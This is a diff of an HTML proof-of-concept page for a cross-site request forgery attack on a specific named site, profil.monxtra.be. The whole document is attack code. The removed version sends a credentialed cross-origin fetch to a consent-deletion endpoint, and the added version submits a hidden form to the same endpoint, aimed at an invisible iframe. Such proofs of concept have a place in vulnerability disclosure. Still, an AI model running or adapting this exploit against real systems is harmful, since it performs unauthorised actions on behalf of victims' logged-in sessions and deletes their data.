@@ -1,30 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF via CORS</title>
-</head>
-<body>
-  <h2>CSRF Attack Page</h2>
-  <button onclick="launchAttack()">Click to Launch CSRF</button>
+  <body>
+    <h2>CSRF PoC - Delete Consent</h2>
+    <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/delete" method="POST" target="hiddenFrame">
+      <!-- Required POST data as URL-encoded body -->
+      <input type="hidden" name="_data" value="routes/manage-profile+/food-preferences+/consents.delete/index">
+      
+      <!-- Manual trigger -->
+      <input type="submit" value="Submit CSRF Request">
+    </form>
 
-  <script>
-    function launchAttack() {
-      fetch("https://profil.monxtra.be/manage-profile/food-preferences/consents/delete?_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.delete%2Findex", {
-        method: "POST",
-        credentials: "include", // 👈 Send cookies (exploits Access-Control-Allow-Credentials)
-        mode: "cors",            // 👈 Use CORS
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "" // Add consentId=123 if needed
-      })
-      .then(response => {
-        alert("Request sent. Status: " + response.status);
-      })
-      .catch(error => {
-        alert("Error: " + error);
-      });
-    }
-  </script>
-</body>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+  </body>
 </html>
